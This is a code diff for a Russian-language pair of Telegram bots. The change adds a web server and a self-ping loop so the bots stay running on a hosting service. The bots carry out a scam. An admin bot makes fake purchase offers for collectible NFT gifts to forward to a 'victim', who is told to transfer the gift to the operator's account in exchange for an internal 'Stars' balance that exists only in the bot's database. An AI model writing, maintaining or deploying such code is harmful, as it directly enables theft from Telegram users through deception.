@@ -1,6 +1,6 @@
 import asyncio, logging, os, re, secrets, sqlite3
 from datetime import datetime, timedelta
-
+from aiohttp import web
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -15,7 +15,7 @@ from aiogram.types import (
 SHOP_TOKEN = os.getenv("SHOP_TOKEN", "PASTE_SHOP_TOKEN")
 ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "PASTE_ADMIN_TOKEN")
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123").split(",") if x.strip().isdigit()}
-SHOP_USERNAME = os.getenv("SHOP_USERNAME", "your_shop_bot") # Юзернейм Витрины БЕЗ @
+SHOP_USERNAME = os.getenv("SHOP_USERNAME", "your_shop_bot")
 SUPPORT = os.getenv("SUPPORT", "@your_support")
 DB_PATH = os.getenv("DB_PATH", "offers.db")
 MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", "500"))
@@ -142,14 +142,14 @@ def kb_menu(uid):
         [InlineKeyboardButton(text="💸 Вывести", callback_data="m:withdraw")],
     ])
 
-# ================= SHOP BOT =================
+# ================= BOTS =================
 shop = Router()
+adm = Router()
 
 @shop.message(Command("start"))
 async def shop_start(m: Message, command: CommandObject):
     payload = (command.args or "").strip()
     upsert_user(m.from_user.id, m.from_user.username, m.from_user.full_name)
-
     if payload.startswith("o_"):
         try: oid = int(payload[2:])
         except ValueError: return await m.answer("Некорректная ссылка.")
@@ -163,18 +163,12 @@ async def shop_start(m: Message, command: CommandObject):
             o = get_offer(oid)
             try: await m.bot.send_message(o["admin_id"], f"🔔 Оффер #{oid} открыт: @{m.from_user.username or '—'}")
             except Exception: pass
-        
         set_status(oid, "accepted")
         await m.answer(
             f"✅ Оффер принят.\n\nПередайте подарок <b>{o['gift_name']}</b> на "
-            f"<b>{o['target_username']}</b> через Telegram → Подарки → Отправить.\n\n"
-            f"После передачи нажмите кнопку.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="📤 Я передал подарок", callback_data=f"u:delivered:{oid}")]
-            ])
-        )
+            f"<b>{o['target_username']}</b> через Telegram → Подарки → Отправить.\n\nПосле передачи нажмите кнопку.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📤 Я передал подарок", callback_data=f"u:delivered:{oid}")]]))
         return
-
     await m.answer("👋 Добро пожаловать! Здесь вы можете получать предложения и выводить Stars.", reply_markup=kb_menu(m.from_user.id))
 
 @shop.callback_query(F.data.startswith("u:delivered:"))
@@ -192,12 +186,10 @@ async def receive_proof(m: Message, state: FSMContext):
     if not oid: return
     o = get_offer(oid)
     if not o or o["user_id"] != m.from_user.id: return await m.answer("Ошибка.")
-    proof = m.text or (m.photo[-1].file_id if m.photo else (m.document.file_id if m.document else "none"))
+    proof = m.text or (m.photo[-1].file_id if m.photo else "none")
     set_status(oid, "paid", proof=proof)
     newbal = add_balance(o["user_id"], o["price_stars"])
-    await m.answer(
-        f"✅ Подтверждение принято.\n<b>{o['price_stars']} ⭐ Stars</b> зачислены на баланс.\n"
-        f"Баланс: <b>{newbal} ⭐</b>", reply_markup=kb_menu(m.from_user.id))
+    await m.answer(f"✅ Подтверждение принято.\n<b>{o['price_stars']} ⭐ Stars</b> зачислены на баланс.\nБаланс: <b>{newbal} ⭐</b>", reply_markup=kb_menu(m.from_user.id))
     try:
         await m.bot.send_message(o["admin_id"], f"📥 Оффер #{oid}: proof от {m.from_user.id}")
         if m.photo: await m.bot.send_photo(o["admin_id"], m.photo[-1].file_id, caption=f"proof #{oid}")
@@ -212,8 +204,7 @@ async def shop_balance(cb: CallbackQuery):
 @shop.callback_query(F.data == "m:withdraw")
 async def wd_start(cb: CallbackQuery, state: FSMContext):
     bal = get_balance(cb.from_user.id)
-    if bal < MIN_WITHDRAW:
-        return await cb.message.answer(f"⚠️ Минимум для вывода — <b>{MIN_WITHDRAW} ⭐</b>.\nУ вас: <b>{bal} ⭐</b>.")
+    if bal < MIN_WITHDRAW: return await cb.message.answer(f"⚠️ Минимум для вывода — <b>{MIN_WITHDRAW} ⭐</b>.\nУ вас: <b>{bal} ⭐</b>.")
     await state.set_state(WdFlow.amount)
     await cb.message.answer(f"💸 <b>Вывод Stars</b>\n\nДоступно: <b>{bal} ⭐</b>\nВведите сумму:")
     await cb.answer()
@@ -249,24 +240,20 @@ async def shop_autoreg(m: Message):
     upsert_user(m.from_user.id, m.from_user.username, m.from_user.full_name)
 
 
-# ================= ADMIN BOT =================
-adm = Router()
-
 @adm.message(Command("offer"))
 async def adm_offer(m: Message, state: FSMContext):
     if not is_admin(m.from_user.id): return
     await state.set_state(AdminFlow.nft_link)
-    await m.answer("1/4. Скинь <b>ссылку на NFT</b> (для картинки, например: https://t.me/nft/PlushPepe-112):")
+    await m.answer("1/4. Скинь <b>ссылку на NFT</b> (например: https://t.me/nft/PlushPepe-112):")
 
 @adm.message(AdminFlow.nft_link)
 async def adm_link(m: Message, state: FSMContext):
     if not is_admin(m.from_user.id): return
     link = m.text.strip()
-    if not link.startswith("http"):
-        return await m.answer("Нужна ссылка (начинается с http).")
+    if not link.startswith("http"): return await m.answer("Нужна ссылка.")
     await state.update_data(nft_link=link)
     await state.set_state(AdminFlow.gift_name)
-    await m.answer("2/4. Введи <b>точное название подарка</b>, как в профиле у жертвы (например, Fine Pen #28,596):")
+    await m.answer("2/4. Введи <b>точное название</b> (например, Fine Pen #28,596):")
 
 @adm.message(AdminFlow.gift_name)
 async def adm_g(m: Message, state: FSMContext):
@@ -298,24 +285,11 @@ async def adm_yes(m: Message, state: FSMContext):
     if not is_admin(m.from_user.id): return
     d = await state.get_data(); await state.clear()
     if not d.get("gift_name"): return await m.answer("Нет данных.")
-    
     oid = create_draft(m.from_user.id, d["gift_name"], d["price"], d["target"], d["nft_link"])
     o = get_offer(oid)
     link = f"https://t.me/{SHOP_USERNAME}?start=o_{oid}"
-    
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(text="✖️ Отклонить", url=f"https://t.me/{SHOP_USERNAME}"),
-            InlineKeyboardButton(text="✅ Принять", url=link)
-        ]
-    ])
-    
-    await m.answer(
-        offer_text(o) + f"\n\n<a href='{o['nft_link']}'>Посмотреть NFT</a>",
-        reply_markup=kb,
-        disable_web_page_preview=False
-    )
-    
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✖️ Отклонить", url=f"https://t.me/{SHOP_USERNAME}"), InlineKeyboardButton(text="✅ Принять", url=link)]])
+    await m.answer(offer_text(o) + f"\n\n<a href='{o['nft_link']}'>Посмотреть NFT</a>", reply_markup=kb, disable_web_page_preview=False)
     await m.answer(f"📨 <b>Оффер #{oid} готов.</b>\n\nПерешли карточку выше жертве.")
 
 @adm.message(Command("no"))
@@ -323,7 +297,21 @@ async def adm_no(m: Message, state: FSMContext):
     if not is_admin(m.from_user.id): return
     await state.clear(); await m.answer("Отменено.")
 
-# ================= MAIN =================
+# ================= WEB SERVER & PINGER =================
+async def handle_ping(request):
+    return web.Response(text="OK")
+
+async def self_ping(url):
+    import aiohttp
+    while True:
+        await asyncio.sleep(600) # 10 минут
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url) as resp:
+                    log.info(f"Self-ping status: {resp.status}")
+        except Exception as e:
+            log.error(f"Ping error: {e}")
+
 async def main():
     init_db()
     shop_bot = Bot(SHOP_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
@@ -331,11 +319,23 @@ async def main():
 
     shop_dp = Dispatcher(storage=MemoryStorage())
     shop_dp.include_router(shop)
-
     adm_dp = Dispatcher(storage=MemoryStorage())
     adm_dp.include_router(adm)
 
-    log.info("Боты запущены")
+    # Веб-сервер для Render
+    app = web.Application()
+    app.router.add_get('/', handle_ping)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', int(os.getenv("PORT", 8080)))
+    await site.start()
+    
+    # Пинг самого себя, чтобы не засыпал
+    render_url = os.getenv("RENDER_EXTERNAL_URL")
+    if render_url:
+        asyncio.create_task(self_ping(render_url))
+
+    log.info("Боты и веб-сервер запущены")
     await asyncio.gather(
         shop_dp.start_polling(shop_bot, allowed_updates=shop_dp.resolve_used_update_types()),
         adm_dp.start_polling(adm_bot, allowed_updates=adm_dp.resolve_used_update_types()),
